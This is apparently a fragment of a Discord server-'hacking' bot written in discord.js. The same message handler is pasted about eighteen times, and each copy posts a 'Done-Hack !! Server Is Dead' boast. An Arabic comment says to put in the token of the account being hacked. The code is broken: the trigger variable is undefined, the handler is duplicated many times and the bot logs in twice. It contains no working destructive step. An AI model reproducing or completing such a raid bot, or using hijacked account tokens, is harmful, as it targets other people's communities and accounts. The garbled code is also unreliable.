client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});
client.on('message', message => {
 if (message.content === x_x) {
  const embed = new Discord.RichEmbed()
   .setColor("ff0000")
   .setThumbnail('https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png')
   .addField('Done-Hack !!', "<@" + message.author.id + ">Server Is Dead")
  message.channel.sendMessage(embed);
  message.author.sendEmbed(embed)
 }
});










client.login('') //هنا توكن البوت او الحساب اللي بتهكره




client.login(process.env.BOT_TOKEN)
